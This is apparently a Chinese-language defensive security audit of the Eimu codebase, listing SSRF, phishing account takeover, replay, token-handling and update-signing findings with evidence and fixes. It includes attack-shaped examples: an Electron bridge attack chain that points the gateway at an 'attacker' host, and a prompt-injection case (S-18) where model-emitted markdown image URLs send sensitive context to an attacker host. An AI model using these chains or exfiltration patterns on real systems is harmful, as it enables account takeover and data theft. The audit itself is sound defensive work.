# Eimu 安全类技术债审计（只读，防御性）

范围：/home/user/Eimu（HEAD 附近 20 次提交）。方法：逐条读源码确认，未改任何仓库文件、未提交、未对线上系统发请求。
说明：所有发现均为静态阅读；「已确认」= 已读到触发路径的完整代码；「疑似」= 代码层成立但依赖部署/上游行为，需人工确认。
未发现仓库内真实密钥（见 S-23）。

严重度口径：P0 = 无前置条件即可资金/账号/主机沦陷；P1 = 低门槛可越权或账号接管；P2 = 需前置条件或影响面受限；P3 = 加固项。

---

## S-01 PWA 登录交接 ticket 兼任「公开 state」与「唯一领取凭证」，可被钓鱼接管账号
【严重度 P1】【确认状态 已确认（代码层）；利用需受害者点击登录链接】
【证据】
- src/app/api/auth/handoff/route.ts:17-36：未登录、无任何绑定的 `POST ?action=create` 返回 `ticket` 与 `loginUrl=/api/auth/{github|google}/start?handoff=<ticket>`。
- 同文件 :38-90：`POST ?action=claim&ticket=` 只凭 ticket 即 Set-Cookie 种下 `napi_token`；`GET ?ticket=` 轮询同理。无创建者浏览器绑定（无 cookie/claim secret/PKCE）。
- src/lib/pwa-handoff.ts:87-160：ticket = 128-bit 随机，deliver/claim 仅校验 ticket、一次性、10 分钟 TTL。
- src/app/api/auth/github/callback/route.ts:100-110（google/callback 同构 :29）：存在 handoff ticket 时**跳过 state-cookie CSRF 校验**，把该 ticket 当 CSRF 防护。
【影响】攻击者先 create 得到 T，把 `loginUrl` 发给受害者；受害者在真站完成 GitHub/Google 登录后，凭证被 deliver 给 T，攻击者 claim 即得受害者 30 天 `napi_token`（设备码钓鱼模型）。另外 ticket 还出现在 GitHub 回调 URL 的 `state` 参数里（Vercel/代理日志、浏览器历史、Referer 都可见），任何看到该 URL 的人在 TTL 内可抢先 claim。
【建议】claim 必须带「只存在于创建者浏览器的私密 claim_secret」（create 时下发 httpOnly cookie 或返回 secret，DB 存其哈希；state 里只放可公开的 ticket id）；授权页给出「你正在授权给设备 X（UA/IP/时间）」确认；callback 落盘 token 在 claim 后立即清空（见 S-17）。

## S-02 /api/canvas/generate 参考图/源图抓取无任何 SSRF 防护，且在上游鉴权前执行
【严重度 P1】【确认状态 已确认】
【证据】
- src/app/api/canvas/generate/route.ts:142-165 `fetchReferenceBuffer`：`fetch(url, { redirect: "follow" })`，无协议/主机/IP/端口限制。
- :233-236 `body.source_image` 只判 `typeof === "string"`，**没有**像 reference_images（:241）/reference_image_urls（:251）那样限 `https:`/`data:image/`；`http://169.254.169.254/…`、`http://127.0.0.1:xxxx` 均可直达。
- :166-170 所谓鉴权只检查「`Authorization` 与 `x-user-id` 头存在」，真正验证在下游 `/api/generate-images`（:328+），而 SSRF 抓取在 :265-272，**先于**下游鉴权执行 → 随便塞 `Authorization: x`、`x-user-id: 1` 即未登录触发。
- :269-271 失败信息回显 `参考图获取失败（<url 前80字>）：<reason 前100字>`，reason 含 `上游返回 <status>`、`不是图片（<content-type>）` → 可做内网端口/服务探测与 content-type/状态码侧信道。
【影响】未认证 SSRF：打内网/本机服务（控制面 VPS 上的 new-api、postgres 端口、metadata 服务）、重定向跟随可绕过任何后加的 host 检查；返回 image/* 的内部资源会被当作参考图送给供应商。Vercel 与控制面 VPS 都跑这份代码，VPS 侧暴露面更大。
【建议】抽一个共享 `safeFetchPublicImage()`：仅 https、解析 DNS 后拒绝私网/回环/链路本地/保留段（解析后连接，防 rebinding）、`redirect:"manual"` 并对每跳重验、限端口 443、流式限大小；`source_image` 与另两个字段同口径；把真实鉴权（`requireVerifiedUser`）放到取图之前；错误信息不回显 URL/状态码。

## S-03 image-proxy / format-crops 的 SSRF 守卫只看字面主机名，且 format-crops 跟随重定向
【严重度 P2】【确认状态 已确认】
【证据】
- src/app/api/canvas/image-proxy/route.ts:27-34 `isForbiddenHost` 仅拦 localhost/.local/.internal/IP 字面量；任何解析到 10.x/127.0.0.1/169.254.x 的公网域名（含 `*.nip.io`、攻击者自控域名 A 记录指向内网、DNS rebinding）直接放行；端口不限。重定向只手动跟一跳并重验字面主机名（:60-80）——仍无 DNS 级检查。
- src/app/api/canvas/format-crops/route.ts:91 `fetch(target, { redirect: "follow" })`：初次主机检查（:63-69）通过后，**重定向可跳到 `http://127.0.0.1`/内网**，守卫失效。
【影响】已登录用户可探测/读取内网中 `Content-Type: image/*` 的资源（image-proxy 会原样回传，上限 25MB）；其余仅有状态码/时间侧信道。
【建议】同 S-02 的共享安全抓取；format-crops 改 manual 重定向逐跳校验；image-proxy 回包强制 `Content-Disposition`/CSP sandbox，拒绝 `image/svg+xml`（见 S-16）。

## S-04 桌面壳：页面可指定任意 gatewayBaseUrl，等于把「本机档案读权限」的信任根交给页面
【严重度 P2（可被任何 eimu.dev 上的 XSS 升级为本机文件读取）】【确认状态 已确认代码路径；是否可利用取决于是否存在 XSS/页面被攻破】
【证据】
- desktop/local-worker.js:80-94 `sanitizeBridgeCredential`：只要求 token 以 `sk-dev-` 开头、`gatewayBaseUrl` 匹配 `^https?://`（允许明文 http，不限主机）。该 IPC 来自页面（preload.js `bridge.setCredential`，仅验 senderFrame host ∈ www.eimu.dev/eimu.dev）。
- desktop/device-bridge-client.js:99-160、300-330：设备端信任网关下发的 `consent.roots`；`scope:"permanent"` 时落盘（`persistConsentRoots`），`normalizeConsentRootList` 接受任意绝对路径（含 `/`）。desktop/lib/bridge-executor.js:123-132、210-232：grantedRoots 并入 allowlist 与 allow 规则，仅受硬 denylist（`policy.isSensitivePath`、`isHardDenied`）约束。
- 页面同样可调 `bridge.enable()` / `bridge.setMode("full")`（preload.js 暴露）。
【影响】攻击链：eimu.dev 任一 XSS（或被篡改的前端资源）→ `setCredential({token:"sk-dev-x", gatewayBaseUrl:"https://attacker"})` + enable + setMode → 攻击者网关下发 `consent{permanent, roots:["/home/u"]}` → `read_file/grep/list_dir` 读 denylist 之外的任意本机文件（文档、源码、聊天记录、`.env` 若不在 denylist 命名样式内等）。工具集本身是只读白名单（list_dir/read_file/grep/stat，无写/执行），preload 无 exec/fs/ipcRenderer 泄露，contextIsolation=true、nodeIntegration=false、webSecurity=true、权限请求白名单，这些做得好。
【建议】壳内写死网关主机白名单（store.tinchak0207.xyz 等）并强制 https；`consent.roots` 必须由壳内原生对话框由用户确认（不能仅信云端声称的同意），拒绝 `/`、家目录整体等过宽根；`setMode("full")` 需要原生确认。

## S-05 桌面自动更新缺少代码签名/发布者校验
【严重度 P2】【确认状态 已确认（配置缺失）】
【证据】desktop/package.json `build`：`publish: generic https://store.tinchak0207.xyz/downloads/desktop`；全文无 `win.signtoolOptions/publisherName/certificateFile`、无 CSC_* 配置；desktop/updater.js 使用 electron-updater generic provider（`autoDownload = true`，:124）。Linux 目标仅 tar.gz。
【影响】更新完整性只靠 TLS + 同一主机上的 latest.yml sha512。该主机（或其 nginx/凭证）被攻破即可向全部桌面端推送并自动执行恶意安装包（且该应用持有本机档案桥能力）；Windows 安装包无 Authenticode 签名也会触发 SmartScreen、无法让 electron-updater 做发布者校验。
【建议】Windows 配 Authenticode 并启用 publisherName 校验；latest.yml 另行签名/由与下载主机隔离的密钥签发；更新源与业务主机分离，限制写权限。

## S-06 /api/payments/mapay/health 无鉴权，参数可驱动对支付商的无限查询与全表扫描
【严重度 P2】【确认状态 已确认】
【证据】src/app/api/payments/mapay/health/route.ts:31-84：无任何鉴权；`?orders=a,b,c…` 数量不限（normalizeMapayOrderCandidates 只做格式过滤，src/lib/generation-core/mapay-order-reconciliation.ts:352-360）；每个单号触发一次支付商 `act=order` 查询；无参数时 `readIntakeOrderNumbers/readCreditOrderNumbers` 全表读取（:362-370）。响应含 `paid_unfulfilled_orders`（未履约订单号）、`query_errors`，catch 分支回 `error.message`。
【影响】匿名者可：①耗尽/触发支付商 API 限流甚至封禁商户；②对控制面 DB 做重查询（DoS）；③枚举订单履约状态与内部报错信息。
【建议】加共享密钥/IP 白名单或仅内网探针；`orders` 上限（如 ≤10）；统一限流；错误体固定文案。

## S-07 NEXT_PUBLIC_LOCAL_TEST_MODE=true 即全站服务端鉴权失效（无生产闸）
【严重度 P2（配置事故即 P0）】【确认状态 已确认】
【证据】src/lib/local-test-mode.ts:8 仅判环境变量；src/lib/image-billing.ts:99-105 `authenticateImageUser` 命中则直接返回 `user.id=0, quota=MAX_SAFE_INTEGER, bypassBilling:true`；src/lib/agent-session-guard.ts:40-52 命中则直接用 `IMAGE_STUDIO_BIZ_KEY` 调网关。`requireVerifiedUser` 与几乎所有用户路由都经此。对比 src/lib/agent-uploads.ts:46 有 `NODE_ENV !== "production"` 保护，但核心路径没有。`NEXT_PUBLIC_*` 在构建期内联，一次误配进生产构建就把所有人变成共享用户 0 且免费。
【影响】误配即：所有用户读写同一份 user 0 数据、免费生成（`bypassBilling`）、拿 B 端 key 打 agent 网关。
【建议】`shouldBypassAuthForLocalTest` 内加 `process.env.NODE_ENV !== "production" && !process.env.VERCEL`；构建期（next.config）若 production 且该变量为 true 则直接 throw。

## S-08 napi_token（30 天会话令牌）无 httpOnly
【严重度 P2】【确认状态 已确认】
【证据】src/app/api/auth/google/callback/route.ts:172-177、github/callback/route.ts:208-213、auth/handoff/route.ts:64-69：`napi_token` 仅 `path/maxAge/sameSite:lax/secure`，无 `httpOnly`（前端 JS 需读取以带 Authorization，见 new-api-client.ts）。
【影响】任何 XSS（含 S-04 所述链路）一次性窃取 30 天长期令牌 → 账号接管 + 余额盗刷；也无法服务端吊销单个会话。
【建议】长期令牌放 httpOnly cookie，由服务端（BFF）注入 Authorization；前端只持短效会话/CSRF token。过渡期：缩短 maxAge、绑定设备指纹、提供服务端吊销。

## S-09 微信公众号回调：签名不覆盖 body、无时间戳/nonce 防重放
【严重度 P2】【确认状态 疑似（需确认微信侧是否启用加密模式、签名三元组是否会进日志）】
【证据】src/lib/wechat-official.ts:11-21：`sha1(sort(token,timestamp,nonce))`，`===` 比较，未校验 timestamp 新鲜度、未去重 nonce；src/app/api/auth/wechat/msg/route.ts:80-125 POST 体 `msg.fromUserName`（openid）直接用于 `loginWechatPeer(openid)` 登录/注册该 openid 账号。
【影响】拿到任意一次合法回调 URL（signature/timestamp/nonce 在 query，易进访问日志/代理日志），即可永久重放该签名并自带伪造 body：用已知 openid 伪造 SCAN 事件，把自己持有的登录 scene 完成为任意 openid 的会话。前置：需知道目标 openid。
【建议】校验 timestamp ±5min + nonce 去重；使用微信「安全模式」（AES 加密 + msg_signature 覆盖 body）；`===` 改常数时间比较。

## S-10 emu-oauth 回环授权码无 PKCE/客户端绑定，可被本机其他监听者截获并换取永久 B 端 key
【严重度 P2】【确认状态 已确认（设计缺陷）；利用需本机在白名单端口有恶意监听者】
【证据】src/app/api/auth/emu-oauth/start/route.ts:35-44 允许端口 {3000,3001,4173,5173,5174,8080,8081,8082,8780,8781,8787}，loopback=`http://127.0.0.1:<port>`，cookie 记录；callback 将 `code`（HMAC(userId,exp)，60s）放在 302 URL query；src/app/api/auth/emu-oauth/exchange/route.ts:25-70 凭 code 直接**铸造永久 B 端 API key**（无会话/无客户端证明）。客户端 `state` 参数只做格式校验，未与 code 绑定（start :35-41）。src/lib/emu-oauth.ts:19-23 签名密钥回退使用 `GITHUB_CLIENT_SECRET`；:105-122 DB 不可用时单次消费退化为进程内存（多实例可重放，TTL 60s）。
【影响】任何占用上述常见开发端口的本机进程（另一个 dev server、恶意软件）或被诱导访问 `start?port=3000` 的场景，可拿到 code 并换取受害者永久 B 端 key（可花钱）。
【建议】引入 PKCE（code_challenge 绑定到 code，exchange 需 verifier）；将 state 绑定到 code；与 GitHub client secret 分离密钥；exchange 要求 DB 持久化消费成功才放行（fail-closed）。

## S-11 generation-billing 内部中继：签名无域前缀/无 nonce，5 分钟内可重放加/退款
【严重度 P2】【确认状态 疑似（需确认 job_id 在上游是否去重、签名请求是否可被旁路获取）】
【证据】src/lib/generation-core/billing-relay.ts:30-44 签名为 `HMAC(secret, ts + "." + body)`，窗口 5 分钟，不含 nonce；src/app/api/internal/generation-billing/route.ts:27-52 验签后直接 `reserveImageQuota/refundImageQuota`（image-billing.ts:227+ 调上游 `add_quota subtract/add`），**未按 `job_id` 做幂等/去重**（`job_id` 只做长度检查）。同一 `GENERATION_BILLING_RELAY_SECRET` 还是其余约 12 个 internal 通道（biz-key-sync 家族，已做域前缀分隔，见 biz-key-sync.ts:21、:38）与 mapay 订单参数签名的根密钥（mapay-order-param.ts:15-18），单点泄露面大。
【影响】任何能窥见一次合法中继请求（日志、中间代理）的人，可在 5 分钟内重复提交 `refund` 反复加余额。
【建议】服务端落 `(job_id, operation)` 唯一键做幂等；签名加 nonce 并短期缓存；按用途派生子密钥（HKDF）而非复用同一根密钥。

## S-12 第三方登录密码为 HMAC 派生的 14 位十六进制，且回退使用 OAuth client secret
【严重度 P2】【确认状态 已确认（设计）】
【证据】src/lib/github-auth.ts:31-37（google-auth.ts:34-39、wechat-identity.ts:17-22 同构）：新 API 账号密码 = `Gh` + HMAC(seed, "github:<id>")[:14]（56 bit）；github callback :128 `seed = GITHUB_LOGIN_SECRET || GITHUB_CLIENT_SECRET`。:140-150 登录失败时还会用管理员权限 `resetGatewayUserPassword` 重置密码（`findGatewayUserByUsername` + reset）。
【影响】①seed 泄露（尤其回退到 GitHub client secret，该值同时被 GitHub OAuth 流程使用）= 全部第三方登录用户密码可计算，凭上游 /api/user/login 直登；②56 bit 对在线爆破足够，但对离线（拿到上游密码哈希）不够。
【建议】seed 与 OAuth secret 解耦且必须显式配置（缺失即启动失败）；改用服务端随机密码 + 身份映射表，不再依赖可推导密码；上游关闭密码登录入口。

## S-13 管理员登录限流是进程内 Map，且按 X-Forwarded-For 首段计数
【严重度 P3】【确认状态 已确认】
【证据】src/app/api/admin/session/route.ts:10-18、:24-45：`failedAttempts` 为模块级 Map（Serverless 多实例/冷启动即清零，实例间不共享）；`requestIp` 取 XFF 首段，非 Vercel 边缘部署时客户端可伪造。用户名比对 `username === configuredAdminUsername()` 非常数时间，用户名缺省值硬编码 `tinchak0207`（src/lib/admin-session.ts:13）。
会话令牌 src/lib/admin-auth.ts:50-80：HMAC-SHA256 + 过期 + timingSafeEqual 实现正确；cookie httpOnly/sameSite=strict/secure(生产)（admin-auth.ts:3-9）；但令牌无会话 ID，登出无法吊销已被窃取的 12 小时 cookie。
【建议】限流改 DB/Redis 持久化并按账号+IP 双维度；去掉缺省用户名；令牌加 jti 并服务端可吊销。scrypt N=16384 偏低，可上调。

## S-14 无任何全局安全响应头（CSP/frame-ancestors/nosniff/HSTS/Referrer-Policy）
【严重度 P3】【确认状态 已确认】
【证据】next.config.mjs（只配 poweredByHeader/images/redirects/rewrites，无 `headers()`）、vercel.json（仅一条 pdf 缓存头）、src/middleware.ts（只处理控制面代理，不加安全头）。
【影响】站点可被 iframe 嵌套（clickjacking，尤其支付/授权页）；任何 XSS 无 CSP 缓解；与 S-04/S-08 叠加放大。内联脚本已存在（layout.tsx:152 等），上 CSP 需 nonce 化。
【建议】先加 `X-Frame-Options/frame-ancestors 'self'`、`X-Content-Type-Options: nosniff`、`Referrer-Policy`、`Permissions-Policy`；再分阶段上 report-only CSP。

## S-15 /api/agent/sessions/[id]/* 会话 id 校验允许 "." 与 ".."，上游路径可被穿越
【严重度 P3】【确认状态 已确认（代码层）；影响受限于调用者自己的 agent key】
【证据】`SESSION_ID_PATTERN = /^[A-Za-z0-9._-]+$/` 在 src/app/api/agent/sessions/[id]/route.ts:15 及 sse-ticket/subagents/stop 等约 20 个同族路由重复；":/..:" 匹配 `..`，拼成 `/agent/v1/sessions/${id}/messages` 后经 URL 规范化变成 `/agent/v1/messages`。对比同族 src/app/api/agent/biz/[...path]/route.ts:58-75 已正确拒绝 `.`/`..`/编码斜杠并 encodeURIComponent。网关侧会话归属校验（apiKey 不匹配回 404，deploy-staging/gateway/internal-http.ts:69）我只抽查了一处。
【建议】复用 biz 代理的 `isUnsafeUpstreamSegment`，并把 pattern 改为要求首字符字母数字；抽出共享 guard 去掉 ~20 份复制。

## S-16 通用 makeProxy 与 /api/token/[id] 将用户可控路径拼进上游 URL
【严重度 P3】【确认状态 疑似（需确认 Next 对 %2F 的参数解码）】
【证据】src/app/api/token/[id]/route.ts:11-14 把 `id` 直接拼 `/api/token/${id}`；src/lib/proxy.ts:48-57 `upstreamPath.replace(":" + key, val)` 同样不转义。若 `id` 解码后含 `../`，fetch 规范化后命中上游任意路径（携带调用者自己的 Authorization/New-Api-User）。
【影响】只能用调用者自己的凭据，无提权；但可绕过本站对特定上游路径的屏蔽/脱敏白名单，并用 DELETE 触达如「删除自己账号」类端点。
【建议】对 id 做 `^\d+$`/`encodeURIComponent` 校验。

## S-17 handoff 令牌明文落库、保留到过期后 1 天
【严重度 P3】【确认状态 已确认】
【证据】src/lib/pwa-handoff.ts:62-70 表 `pwa_login_handoff.token TEXT`；claim（:123-140）只置 `claimed_at`，不清 token；清理仅 `expires_at < now() - 1 day`（:97-100）。
【建议】claim 时同一语句置空 token；存储前加密（KMS/应用层密钥）。

## S-18 AgentMarkdown 对 Markdown 链接/图片 URL 无 scheme 与来源过滤
【严重度 P3】【确认状态 已确认；XSS 被 React 19 缓解，外泄面存在】
【证据】src/lib/agent-markdown.ts:121-140 直接把 `tok.href` 放入 `link/img`；src/components/agent-chat/AgentMarkdown.tsx:126-134 `<a href={span.href} target="_blank">`、`<img src>` 无过滤。marked 仅 lexer、不输出 HTML（无 `dangerouslySetInnerHTML`，设计正确）；React 19 对 `javascript:` href 会替换为抛错（react-dom-client.production.js:1414），所以未见脚本执行。
【影响】Prompt injection 场景下模型输出 `![](https://attacker/?d=<敏感上下文>)` 即自动外发请求（零点击数据外泄）；`data:text/html`/`vbscript:` 等其他 scheme 未过滤。
【建议】链接限 http/https/mailto，图片限白名单域名（平台 CDN）或经站内代理；其他 `dangerouslySetInnerHTML` 用法均为 JSON-LD 与固定内联脚本且数据静态（FaqSection.tsx:22、layout.tsx:152-191、use-cases/workflows/pricing 页），未发现用户输入进入——属已核对无问题；但 JSON-LD 建议统一对 `<` 转义。

## S-19 /api/lora-models 匿名可用，使用服务端 PixAI key 代理目录
【严重度 P3】【确认状态 已确认】
【证据】src/app/api/lora-models/route.ts:20-58：无任何鉴权/限流，服务端带 `PIXAI_API_KEY` 拉上游目录并回传。
【影响】匿名放大器：消耗上游额度/触发上游限流，keyword 任意透传。
【建议】加 `requireVerifiedUser` + 缓存 + 限流。

## S-20 sub2api-fix-groups / image-upstream-probe：静态 bearer 做写操作鉴权，两路由共用同一 token
【严重度 P3】【确认状态 已确认】
【证据】src/app/api/admin/sub2api-fix-groups/route.ts:6-45 与 image-upstream-probe/route.ts:20-26：共用 `IMAGE_UPSTREAM_PROBE_TOKEN`，不走管理员会话；比较前先比长度（泄露长度，影响小）；前者会对上游账号 PATCH 改写 group_ids（写操作），无审计、无限流。admin 目录其余 27 个 route.ts 均调用 requireAdminSession（已逐个核对，401 在 catch 分支处理）。
【建议】写操作迁移到管理员会话 + 审计；探针与改写使用不同 token；token 一次性 rotate。

## S-21 其余 SSRF/注入面（Agent 运行时，按设计需出站）
【严重度 P3】【确认状态 已确认（设计取舍，需网络层兜底）】
【证据】src/lib/vision-tools.ts:204-225 `readImageSource` 对 `image_url` 任意 `fetch`、非 2xx 时把 **body 前 500 字回显**；:240-262 `image_path` 读任意本地路径（仅按扩展名白名单）。agent 运行时工具大量使用 `spawn/execFile`（deploy-staging/opencode-runtime/*、gateway/lint.ts 等），我抽查的均为数组参数形式、无 `shell:true`；gateway/harness-hooks.ts:724 `bash -lc action.command` 属于 hook 配置执行。sql.unsafe 仅出现在 tools/migrate-generation-db.ts（读本地迁移文件），SQLite DDL 的 `${table}/${column}` 为内部常量，未发现用户输入拼接 SQL；业务 SQL 全部走 postgres.js 模板参数。
【影响】该运行时位于沙箱（bwrap）内，但若沙箱网络未隔离，LLM 可被提示注入后读内网响应体。
【建议】沙箱出站网络策略默认拒绝私网；vision 工具不回显响应体。

## S-22 internal/ cron/ 共享密钥鉴权：已核对基本合格（含两个小改进点）
【严重度 P3】【确认状态 已确认】
【证据】cron：src/app/api/cron/generation-worker/route.ts:11-56 fail-closed、常数时间、`ALLOW_LOCAL_CRON` 需显式开启、不信 Host；internal/callback-worker 同（route.ts:20-45）；internal/* 14 条走 HMAC `verifyBizKeySync`（biz-key-sync.ts:51-67，含 5 分钟窗口、timingSafeEqual、域前缀），无缺省值（缺 secret 回 503）；platform-status 走 HMAC(raw body)（memory-hmac.ts）。
小问题：①HMAC 窗口内无 nonce（见 S-11）；②`ALLOW_LOCAL_CRON=1` 一旦误配到生产即无鉴权，建议叠加 `NODE_ENV !== "production"`；③callback-worker 的 `expected.length !== actual.length` 先比长度；④emu-oauth/mapay-order-param 复用同一根密钥。

## S-23 秘密扫描
【严重度 信息】【确认状态 已确认】
git 全历史（`git log --all -p`，约 20 次提交）按任务给定正则扫描，命中的全部是测试夹具/示例：`sk-biz-test-…`（desktop/lib/bridge-credential.test.js）、`sk-biz-0a1b2c3d…`、`sk-biz-0123456789abcdef…`、`AKIA1234567890ABCDEF`（密钥扫描规则的测试样本）、`BEGIN PRIVATE KEY` 字面串（规则样本）、`postgres://…REPLACE_WITH_PASSWORD@…`（.env.example）。另扫了 AIza/xox/ghs_/github_pat_/postgres:// 带口令/JWT/Bearer 长串，均无真实值。工作树中 `.env.biz-key`、`.env`、`.env.local` 已被 .gitignore 覆盖；`git ls-files` 中的 `.env.example`/`control-plane.env.example` 为占位符。未发现硬编码回退密钥（`SECRET|TOKEN|KEY ?? "literal"` 模式零命中）。
唯一值得留意：测试里有注释「32 hex，同真实 B」的 `sk-biz-1f3a9c55…`（前6位 sk-biz-），形态像真实 key；其余皆明显合成。建议人工确认该值是否曾为真实 key，若是则轮换。

## S-24 速率限制盘点
【严重度 P3】【确认状态 已确认】
- 有限流：v1/* 全族（B 端 key 的 RPM，biz-api-key-rate-limit.ts）、agent/optimize-prompt（429）、skills/mine、user/biz-keys、mcp、emu-oauth exchange、管理员登录（但见 S-13）。
- 无应用层限流（仅靠余额）：基于登录态的生成类 `generate-images`、`generate-videos`、`generation-jobs`（POST）、`canvas/generate`、`agent/sessions/*/messages`；匿名可达的 `payments/mapay/health`（S-06）、`lora-models`（S-19）、`auth/handoff?action=create`（每次写 DB 一行）、`auth/wechat/qr|start`。
- 仓库内**没有**短信/邮件验证码发送接口（登录只有 GitHub/Google/WeChat 扫码），故该项不适用。
【建议】按 userId/IP 在入口统一加滑动窗口限流（含并发 job 上限）；匿名端点加 IP 限流。

---

## 已核对、未发现问题的面（便于后续不重复）
1. 鉴权与 IDOR：projects、canvas/projects|nodes|assets、history、share、generation-jobs、uploads(sign/commit)、project-assets(+shares)、v1/{assets,history,images,canvas}、blender-artifact 均以 `requireVerifiedUser`/`authenticateBizApiKey` 得到的服务端 userId 做存储命名空间/查询条件（`readCanvasProject(userId, projectId)`、`getGenerationJobForTenant`、`ownedRecord(userId, shareId)` 等），未发现跨账号读写；shareId 128-bit 随机。blender-artifact 有文件名白名单 + startsWith 目录守卫（路径逃逸已防）。
2. 支付 notify（src/app/api/payments/mapay/notify/route.ts）：MD5 验签是支付商协议所限（verifyMapaySignature，mapay.ts:67-70，比较非常数时间属小问题）；价格一律服务端 `resolvePricingPlan` 重算，`mapayMoneyAcceptable` 拒绝少付；入账以 `out_trade_no` 为幂等键；`param` 为自签 HMAC（mapay-order-param.ts）；test-callback 在生产 404 且需 token（route.ts:19-26）；/api/topup 已 410 停用。未发现可少付多得/重复入账路径（上游调额幂等性依赖 out_trade_no 去重表，未深入）。
3. media-download：host 精确白名单 + https + 禁 userinfo/端口 + redirect:manual（route.ts:36-50、media-url.ts）——合格；仅缺流式体积上限（chunked 时 content-length 缺失即不限）。
4. 桌面壳：contextIsolation/nodeIntegration/webSecurity 正确，子窗口继承，导航/重定向双事件拦截，权限白名单，preload 仅具名 channel，local-worker 每个 handler 验 senderFrame、realpath+denylist、ffmpeg `shell:false` argv 白名单，E2E 覆盖需显式 `EIMU_E2E=1`。device bridge 工具集仅 list_dir/read_file/grep/stat 只读。
5. XSS：marked 仅 lexer 到 React 元素树（无 HTML 字符串渲染）；dangerouslySetInnerHTML 仅 JSON-LD/固定内联脚本。
6. CORS：仅 gateway auth-gw.ts:205-225 白名单回显并 Vary:Origin；Next 侧仅 openapi.json 白名单与 oauth-protected-resource 的 `*`（公开元数据）；未发现 `Allow-Credentials: true` + 反射任意 Origin。
7. 管理员 cookie：httpOnly + sameSite=strict + secure(生产)；管理端 28 个 route 中 26 个走 requireAdminSession，另 2 个走静态 token（S-20）。

## 总表

| 编号 | 标题 | 严重度 | 状态 | 主要位置 |
|---|---|---|---|---|
| S-01 | PWA 交接 ticket 双重身份，可钓鱼接管账号 | P1 | 已确认 | api/auth/handoff/route.ts:17-90; lib/pwa-handoff.ts |
| S-02 | canvas/generate 未认证 SSRF（source_image 无限制，鉴权在抓取之后） | P1 | 已确认 | api/canvas/generate/route.ts:142-165,233,265 |
| S-03 | image-proxy/format-crops 只验字面主机名；format-crops 跟随重定向 | P2 | 已确认 | api/canvas/image-proxy/route.ts:27-80; format-crops/route.ts:91 |
| S-04 | 桌面桥 gatewayBaseUrl/consent 根由页面/云端决定，XSS 可升级为本机文件读 | P2 | 已确认路径 | desktop/local-worker.js:80-94; device-bridge-client.js:99-330 |
| S-05 | 桌面自动更新无代码签名/发布者校验 | P2 | 已确认 | desktop/package.json; updater.js |
| S-06 | mapay/health 匿名、orders 无上限、触发支付商查询与全表扫描 | P2 | 已确认 | api/payments/mapay/health/route.ts |
| S-07 | LOCAL_TEST_MODE 无生产闸，误配即全站免鉴权免费 | P2 | 已确认 | lib/image-billing.ts:99; agent-session-guard.ts:40 |
| S-08 | napi_token 30 天且非 httpOnly | P2 | 已确认 | auth/*/callback; auth/handoff/route.ts:64 |
| S-09 | 微信回调签名不覆盖 body、无重放防护 | P2 | 疑似 | lib/wechat-official.ts:11; auth/wechat/msg/route.ts |
| S-10 | emu-oauth 回环授权码无 PKCE，可换永久 B 端 key | P2 | 已确认 | auth/emu-oauth/start|exchange; lib/emu-oauth.ts |
| S-11 | generation-billing 中继无幂等/nonce，窗口内可重放；根密钥复用 | P2 | 疑似 | lib/generation-core/billing-relay.ts:30; api/internal/generation-billing |
| S-12 | 三方登录密码为 56bit HMAC 派生，回退用 OAuth client secret | P2 | 已确认 | lib/github-auth.ts:31; auth/github/callback:128 |
| S-13 | 管理员登录限流内存级/XFF；缺省用户名；令牌不可吊销 | P3 | 已确认 | api/admin/session/route.ts; lib/admin-auth.ts |
| S-14 | 无全局安全响应头（CSP/XFO/nosniff/HSTS） | P3 | 已确认 | next.config.mjs; vercel.json |
| S-15 | agent sessions/[id] 允许 `..`，上游路径穿越 | P3 | 已确认 | api/agent/sessions/[id]/*/route.ts |
| S-16 | makeProxy / token/[id] 路径拼接未转义 | P3 | 疑似 | lib/proxy.ts:48-57; api/token/[id]/route.ts |
| S-17 | handoff 令牌明文落库且保留至过期后 1 天 | P3 | 已确认 | lib/pwa-handoff.ts:62-100,123 |
| S-18 | Markdown 链接/图片无 scheme/来源过滤（外泄信道；XSS 被 React19 缓解） | P3 | 已确认 | lib/agent-markdown.ts:121; AgentMarkdown.tsx:126 |
| S-19 | lora-models 匿名代理付费 key | P3 | 已确认 | api/lora-models/route.ts |
| S-20 | 静态 bearer 做写操作鉴权且两路由共用 | P3 | 已确认 | api/admin/sub2api-fix-groups; image-upstream-probe |
| S-21 | agent 运行时工具出站/本地读取（需网络层兜底） | P3 | 已确认（设计） | lib/vision-tools.ts:204-262 |
| S-22 | internal/cron 鉴权总体合格，附 4 个小改进 | P3 | 已确认 | api/cron/*; api/internal/* |
| S-23 | 秘密扫描：仓库与全历史无真实密钥（1 处待人工确认形态） | 信息 | 已确认 | git history |
| S-24 | 生成类/匿名端点缺应用层限流；无短信/邮件验证码接口 | P3 | 已确认 | 见节内清单 |

建议处理顺序：S-02 → S-01 → S-06 → S-07 → S-04/S-08/S-05 → 其余。S-02、S-06 修改面最小、收益最高；S-01 需前后端配合。
